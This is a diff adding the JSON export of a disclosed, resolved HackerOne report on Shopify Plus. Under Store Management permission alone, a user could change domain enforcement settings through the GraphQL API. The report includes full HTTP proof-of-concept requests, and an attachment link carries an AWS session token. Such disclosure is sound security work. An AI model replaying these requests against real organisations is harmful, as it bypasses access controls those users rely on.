@@ -1,0 +1,142 @@
+{
+  "id": 1084892,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDg0ODky",
+  "url": "https://hackerone.com/reports/1084892",
+  "title": "[h1-2102] [Plus] User with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-01-22T22:10:18.150Z",
+  "submitted_at": "2021-01-22T22:10:18.229Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ngalog",
+    "url": "/ngalog",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-04-21T22:05:27.786Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-04-21T22:05:27.724Z",
+  "team_member_agreed_on_going_public_at": "2022-04-21T18:50:12.812Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nUser with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only\n\n## Description:\nUser with `Store management` permission - {F1168470} only, is able to change user management settings using the graphql\n\n## Steps To Reproduce:\n- \n- \n- \n- \n\n- As an org plus admin, visit https://shopify.plus/:org_plus_id/users/invite and invite an user to have `store management permission` - (The purpose is to enable the low-privileged user to have access to https://shopify.plus/:plus_org_id/stores/api\n- As an org plus admin, create a Org domain, by visiting `https://shopify.plus/:id/users/security` and `Add Domain`\n- Login as the low-priviledged user, and visit shopify.plus and click around until you made a valid graphql call to shopify.plus, it looks something like this `POST /34946971/stores/api HTTP/1.1`\n- Make this call to figure out the domain id of your organization as a low privileged user \n\n```\nPOST /34946971/stores/api HTTP/1.1\nHost: shopify.plus\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\n...\n\n{\"query\":\"query{organization{domains{id}}}\"}\n```\n\n- Grab the id and replace the REPLACE_ME in the below GraphQL call\n\n```\nPOST /34946971/stores/api HTTP/1.1\nHost: shopify.plus\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\n...\n\n{\"query\":\"mutation  {\\n  changeDomainEnforcementState(domainIds: [\\\"REPLACE_ME\\\"],enforcementState:NOT_ENFORCED) {\\n    organization {\\n      id\\n      domains {\\n        id\\n        domainName\\n        status\\n        verified\\n        __typename\\n      }\\n      __typename\\n    }\\n    userErrors {\\n      field\\n      message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\n\n- Then it shows you are able to `changeDomainEnforcementState` by just having Store Management permission\n\n\n\n## Supporting Material/References:\n\n## Impact\n\nUser with Store Management permission can enforce/unenforce domain state",
+  "weakness": {
+    "id": 122,
+    "name": "Improper Privilege Management"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1168470,
+      "file_name": "Screen_Shot_2021-01-22_at_11.15.03_PM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dibowxlxtkmb5y4x45d1cohhzpvd?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2021-01-22_at_11.15.03_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2021-01-22_at_11.15.03_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYNXMROI%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T221354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC8IkEZzamf6ZYusb%2FpSAF4XSeKTPksx736k%2FqCglmVowIhAKxhaZSwTQhQtHm4n1DZb3qc7bj4NWTE43eYwNrdmR69KroFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxPD1mlTaYI5akgu2MqjgUeHxSASquiAsrb1XogKZsBC00GbfFlctRxkOKuzReD6IKGkeKONZYfdE04W1VBt9oXFYgVHzko2kkM38H0Y0u4kb12dz55TrA2e7q7Qkre5xtv1RG06qg8DgHu7Jxze0wCmQaBVDm1TSxoNdjtK5lLjZckJdqWUmD%2FXvo6RrA5z8YwUeVWTc71x2jmE8lBmapK4i%2FuGFUFYAUGJEFv%2Bs%2BC1ZgMI%2FtUG2un7V4rY%2Br7o6URCyk5n8GCN5Pq3dCQfj45Xbi879CAqc1%2FkNDeTfIuOTE4p9f8He3%2BKTvxwm%2BVLs%2FG5DeZ5TTpv%2FmiUVDIyEjxC2L%2BSZnyjZKP4HhKzCCOheIADUB3fmPo%2BkQhmV7Em43TKNTfRtCOOv3fQ0TzNm%2FzhDZdNghV52dcmgdFjlVIV7cUWKQvPFWm76b0eKQvNbsj9ENmVkrr5hBAzpT%2BbO00HKAd8rkEmyoFNWYEm5Ee5M9PPNDy1as%2BV4qLOecAn5A1tSN3lEsZ8bKIyMieA4zJxBW45CwfzlMWvGRzvm42KdcjgIx7tDVdezOKURFFf%2FHeU4wM1YVCfBw9jXVsMhLnii7%2BBT8dD6nBag5lPHogVHaeFM84bms1hWdaGk3GDhGwnVWIqAwpKRHBBxiAHtIrHyl4%2BAcG7FHefXM8tintpdqgX5wFBtmF3JkMcWeB%2B0EejaiyBX2Gh%2Fl7WfwQXPEotIjtW6d%2F52HY2CD1CyPC5oKby9aovgOgHz1I%2Fqe7jrMxHJb6FRx9SfLXwDBkZCGoDTiYnFoUr8H8bZwqNJmaQecNO7zVWMp4RW4q63a1UIfjWApUrW5j1A%2Brk%2F43eSlM3xA6MbkjbexIXxqhiInnM04Pd6F17CTzeGf7pWswn8nizAY6sAE60gVb%2Bdw28aawyMSx6Z%2Be6HuvhZjet4TLpuu3UdqI3OIxy88qhZfQ7amajGKJLHtgzDwI9THXujLG%2FzM7%2BRTzaFj8IvaRa66000MrJvqu9P8lUyeFGHRxqiarKtRlxyb2PcYUhlTMwAYFgROli0FllDdP0i53u%2FpTznVyNTzrI8GqnU4bAzwbsM%2BlcnyTUhO9Ad%2BNrCi%2Fb0UwMRJFzoJzU22mp0LnQ6UM0h0nR%2Bp7bg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=db55099338fcd1f71a91152f3165a556a3c0530452c5373fab11a80b12de3b9c",
+      "file_size": 222355,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "rondons",
+    "n1m0",
+    "similardisaster",
+    "zy9ard3",
+    "shreyaschavhan",
+    "ali",
+    "encodedguy",
+    "shubham_srt",
+    "ayoub0x1",
+    "sudi",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 62960,
+    "asset_type": "OTHER",
+    "asset_identifier": "Plus Web Admin with Single Domain Feature",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
